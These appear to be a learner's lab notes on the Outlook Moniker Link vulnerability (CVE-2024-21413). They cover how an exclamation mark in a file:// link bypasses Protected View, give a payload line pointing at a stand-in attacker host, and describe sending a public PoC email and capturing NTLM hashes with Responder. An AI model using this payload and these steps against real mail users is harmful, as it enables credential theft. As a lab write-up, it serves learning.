moniker link = old Windows type of hyperlink for locating object/files across a network
They were very vulnerable
Outlook has "Protected View", which:
- opens emails in read-only mode, 
- which should in theory prevent attacks, but...

By including an exclamation mark in a hyperlink, Protected View is bypassed

# file:// tells outlook to acces a file
# the exclamation mark messes with Protected View
file://ATTACKER/test!exploit

Proof of Concept

We tested a PoC by CMNatic, https://github.com/CMNatic/CVE-2024-21413

we tried this with a tool called responder at attacker (for listening)

we copied and replaced placeholders of CMNatics exploit.py
then ran the exploit.py, sending the mail

*** A small but big problem the lab didn't tell us about ***
there was a process running on port 445 - the one that SMB uses.
This meant that we couldn't listen on that port,
even though everything was correct, we got nothing in responder, 
up until we decided to kill the process with:
sudo systemctl stop smbd nmbd vnmbd 2>/dev/null

on the target we clicked on the link in outlook 
and it showed us an error that some file was not found
but the exploit worked.
In responder we got the hashes.
